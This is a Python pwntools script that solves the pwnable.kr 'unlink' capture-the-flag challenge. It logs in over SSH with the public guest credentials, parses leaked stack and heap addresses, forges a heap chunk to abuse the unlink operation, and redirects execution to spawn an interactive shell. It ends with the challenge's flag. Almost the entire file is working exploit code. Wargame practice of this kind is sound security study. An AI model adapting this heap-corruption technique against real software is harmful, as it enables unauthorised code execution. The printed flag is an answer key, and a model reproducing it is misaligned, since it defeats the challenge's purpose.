#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './unlink')

host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'unlink'
password = args.PASSWORD or 'guest'
remote_path = 'unlink'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *unlink
continue
'''.format(**locals())

### helpers ###
def leak_stack(io):
    io.recvuntil("here is stack address leak: ")
    stack_leak = eval(io.recvline()[:-1])
    log.info(f"stack leak: {hex(stack_leak)}")
    return stack_leak

def leak_heap(io):
    io.recvuntil("here is heap address leak: ")
    heap_leak = eval(io.recvline()[:-1])
    log.info(f"heap leak: {hex(heap_leak)}")
    return heap_leak

def craft_tag_obj(fd: int, bk: int):
    obj  = p32(bk)
    obj += p32(fd)
    obj += p64(0) # Garbage data in buf
    return obj 

def craft_obj_heap_chunk(fd: int, bk: int):
    chunk  = p32(0) # prev_size = 0 //cuz prev chunk is allocated
    chunk += p32(0x20 | 1) # prev_inuse is on & size = 0x20
    chunk += craft_tag_obj(fd, bk)
    return chunk

# -- Exploit goes here --
def main():
    ### run ###
    io = start()
#    gdb.attach(io)    

    ### leaks ###
    stack = leak_stack(io)
    heap  = leak_heap(io)

    ### payload ###    
    payload  = craft_tag_obj(0x11223344, 0x22334455) + craft_obj_heap_chunk(heap+0x50, stack-0x20) # exploit unlinking process so the ebp will point to heap dummy stack controlled by our exploit
    payload += cyclic(0x40 - len(payload)) # padding
    payload += p32(heap+len(payload)+0x10) # lea that pointer into esp, its point to the next argument -> exe.sym.shell
    payload += p32(exe.sym.shell) # when the program will hit that function we will get a shell.

    log.info("sending payload...")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()

#flag: wr1te_what3ver_t0_4nywh3re
